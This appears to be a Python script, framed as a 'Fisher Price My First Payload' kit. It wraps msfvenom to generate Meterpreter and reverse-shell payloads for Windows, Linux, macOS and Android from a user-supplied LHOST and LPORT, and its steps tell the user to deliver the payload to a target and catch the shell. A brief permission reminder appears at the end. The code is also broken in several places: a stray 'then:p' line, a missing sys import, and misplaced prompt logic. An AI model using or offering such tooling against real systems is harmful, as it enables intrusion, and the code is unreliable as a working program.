import streamlit as st
import subprocess

def check_msfvenom_installed():
    try:
        subprocess.run(["msfvenom", "-h"], capture_output=True, text=True, check=True)
        return True
    except FileNotFoundError:
        return False

# Streamlit app
#st.title('Fisher Price My First Payload')
# Check if MSFvenom is installed
#if not check_msfvenom_installed():
#    st.error("MSFvenom is not installed or not found in the system's PATH.")
#    st.stop()
    
 
# Display ASCII art banne
# Color Class
class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'


def explain_step(step, details):
    print(f"{colors.GREEN}[+] Step: {step}{colors.RESET}")
    print(f"{colors.YELLOW}[+] Details: {details}{colors.RESET}\n")

def main():
    print(f"{colors.GREEN}[+] Welcome to the Fisher Price 'My First Payload' Fin Set. You'll be popping shells in no time.{colors.RESET}")
    print(f"{colors.GREEN}[+] This script will guide you through creating a payload with MSFvenom.{colors.RESET}")

def pause():   
    input(f"{colors.YELLOW}[+] Press Enter to continue....{colors.RESET}")
    print(f"{colors.YELLOW}[+] {colors.RESET}")

def sleep(time):

    print(f"{colors.GREEN}[+] Select your payload, enter your ip (lhost) and the port metasploit is listening on...  .{colors.RESET}") 
    input(f"{colors.YELLOW}[+] {colors.RESET}")

payloads = {
    "1": "windows/meterpreter/reverse_tcp",
    "2": "windows/meterpreter/bind_tcp",
    "3": "linux/x86/meterpreter/reverse_tcp",
    "4": "osx/x64/shell_reverse_tcp",
    "5": "android/meterpreter/reverse_tcp"
    }

for key, value in payloads.items():
    print(f"{colors.YELLOW}[+] {key}. {value}{colors.RESET}")
    choice = input(f"{colors.YELLOW}[+] Enter the number for the payload you wish to use: {colors.RESET}")
    payload = payloads.get(choice, None)

if not payload:
    print(f"{colors.RED}[-] Invalid choice.{colors.RESET}")
    then:p
    

    lhost = input(f"{colors.YELLOW}[+] Enter LHOST (Your IP): {colors.RESET}")
    lport = input(f"{colors.YELLOW}[+] Enter LPORT (Listening Port): {colors.RESET}")
    format = input(f"{colors.YELLOW}[+] Enter the format for your payload (e.g., exe, elf, php, raw): {colors.RESET}")

    print(f"{colors.RED}[+] Note: Ensure that MSFvenom is in your system's PATH.{colors.RESET}")
    
    filename = f"payload.{format}"
    explain_step("4", "Generate the payload with the options you've selected.")
    try:
        result = subprocess.run(["msfvenom", "-p", payload, "LHOST=" + lhost, "LPORT=" + lport, "-f", format, "-o", filename],
                                capture_output=True, text=True, check=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"{colors.RED}[-] Error generating payload:{colors.RESET}")
        print(e.stderr)
        sys.exit(1)
    except FileNotFoundError:
        print(f"{colors.RED}[-] MSFvenom not found. Make sure it is installed and in your system's PATH.{colors.RESET}")
        sys.exit(1)

    explain_step("5", f"Save the payload to a file named {filename}.")
    print(f"{colors.GREEN}[+] Payload saved as {filename}{colors.RESET}")

    explain_step("6", "Set up a listener using Metasploit's multi/handler with the same payload and options.")
    print(f"{colors.YELLOW}[+] You will need to manually configure Metasploit to listen for the incoming connection.{colors.RESET}")

    explain_step("7", "Deliver the payload to the target system and execute it. Your listener should catch the reverse shell.")
    print(f"{colors.GREEN}[+] Legal and ethical considerations: Always ensure you have explicit permission to use these tools on any network or system.{colors.RESET}")

    print(f"{colors.GREEN}[+] The MSFvenom wrapper script has completed.{colors.RESET}")

if __name__ == "__main__":
    main()
